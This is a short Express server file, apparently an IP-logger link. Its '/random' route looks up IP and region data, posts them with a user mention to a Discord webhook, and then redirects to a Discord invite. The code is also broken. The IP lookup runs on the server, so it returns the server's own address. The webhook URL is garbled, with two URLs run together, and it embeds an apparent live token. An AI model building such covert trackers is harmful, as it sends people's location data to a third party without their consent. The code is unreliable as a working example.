import express from "express";

express()
  .get("/random", async (req, res) => {
    try {
      const got = await fetch("https://ipinfo.io/json").then(r => r.json());
      if (!got.ip || !got.region) {
        console.error("IP情報の取得に失敗:", got);
        return res.status(500).send("Server error: failed to get IP info");
      }

      await fetch("https://discord.com/api/webhooks/1467036747832758334/_https://discord.com/api/webhooks/1467086114245574657/q8IPAwByCouW4LJ_uwbbtsT1X8zJ9vdYA-6dmClQFhHiLxWFe6UZ5Gm9FjdDy8FI9qnf", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: `${got.ip} ${got.region} <@1238820524256268381>` })
      });

      res.redirect("https://discord.gg/ctkp-aarr");
    } catch (err) {
      console.error("予期せぬエラー:", err);
      res.status(500).send("Internal Server Error");
    }
  })
  .listen(3000, () => console.log("Server running on port 3000"));
